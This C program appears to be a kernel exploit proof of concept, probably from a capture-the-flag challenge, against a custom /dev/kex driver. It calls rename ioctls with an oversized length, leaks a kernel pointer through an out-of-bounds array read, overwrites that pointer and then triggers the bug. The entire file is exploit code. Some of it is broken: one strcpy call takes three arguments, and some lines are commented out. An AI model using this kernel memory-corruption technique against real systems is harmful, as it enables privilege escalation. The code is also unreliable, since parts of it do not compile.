#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>


#define KEX_BASE 0x43544601
#define KEX_CREATE (KEX_BASE)
#define KEX_GETARR (KEX_BASE + 1)
#define KEX_SETARR (KEX_BASE + 2)
#define KEX_DELETE (KEX_BASE + 5)
#define KEX_RENAME (KEX_BASE + 7)

struct kex_param {
  char name[32];
  int ind;
  int value;
};

struct kex_rename_param {
  char name[32];
  char new_name[32];
  int len;
};

int main() {
  struct kex_param param;
  struct kex_rename_param rename_param;
  int fd = open("/dev/kex", 0);
  if (fd < 0) {
    perror("open()");
    return 1;
  }


  strcpy(param.name, "kek", sizeof(param.name));
  if (ioctl(fd, KEX_CREATE, &param) < 0) {
    perror("ioctl() create");
    return 1;
  }

  strcpy(rename_param.name, "kek");
  strcpy(rename_param.new_name, "testing");
  //int val = 0;
  //strncpy(rename_param.new_name, &val, 4);
  rename_param.len = 1111;
  if (ioctl(fd, KEX_RENAME-1, &rename_param) < 0) {
    perror("ioctl() rename2");
    return 1;
  }

  strcpy(rename_param.name, "testing");
  //int val = 0;
  //strncpy(rename_param.new_name, &val, 4);
  rename_param.len = 1111;
  if (ioctl(fd, KEX_RENAME-1, &rename_param) < 0) {
    perror("ioctl() rename3");
    return 1;
  }

  param.name[0] = 0;
  param.ind = 0xff;
  param.value = 0;
  if (ioctl(fd, KEX_GETARR, &param) < 0) {
    perror("ioctl() getarr");
    return 1;
  }

  printf("[*] name pointer was at: 0x%08x\n", param.value);

  param.ind = 0xff;
  param.value = 0x55555555;
  if (ioctl(fd, KEX_SETARR, &param) < 0) {
    perror("ioctl() setarr");
    return 1;
  }

  //param.name[0] = 0x3;
  param.ind = 0xff;
  param.value = 0xffff;
  if (ioctl(fd, KEX_GETARR, &param) < 0) {
    perror("ioctl() setarr");
    return 1;
  }
  printf("[*] Name pointer is now pointing at: 0x%08x\n", param.value);

  printf("[*] Writing to address\n");
  strcpy(rename_param.name, "testing");
  rename_param.name[0] = 0x0;
  //int val = 0;
  //strncpy(rename_param.new_name, &val, 4);
  rename_param.len = 1111;
  if (ioctl(fd, KEX_RENAME-1, &rename_param) < 0) {
    perror("ioctl() rename");
    return 1;
  }

  printf("[*] Triggering bug...\n");
  rmdir("/dev/kek");

  exit(0);
}
